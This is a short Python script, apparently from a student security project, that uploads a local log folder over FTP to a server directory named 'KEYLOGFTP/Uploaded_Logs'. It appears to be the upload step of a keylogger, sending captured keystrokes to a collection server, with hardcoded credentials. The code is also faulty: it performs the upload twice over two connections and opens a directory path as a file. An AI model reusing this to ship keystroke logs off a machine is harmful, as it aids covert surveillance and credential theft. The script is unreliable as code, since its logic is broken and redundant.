import ftplib
import os

def upload_ftp(server, username, password, remote_dir, local_dir):
    with ftplib.FTP(server, username, password) as ftp:
        with open(local_dir, "rb") as file:
            ftp.storbinary(f'STOR {remote_dir}', file)
    ftp = ftplib.FTP(server)
    ftp.login(username, password)

    with open(local_dir, "rb") as f:
        ftp.storbinary(f'STOR {remote_dir}', f)

    ftp.quit()

server = "127.0.0.1"
username = "THOMAS"
password = ""
remote_dir = "C:/KEYLOGFTP/Uploaded_Logs"
local_dir = "C:/Users/thoma/Desktop/Zuyd/Security/Logs"

upload_ftp(server, username, password, remote_dir, local_dir)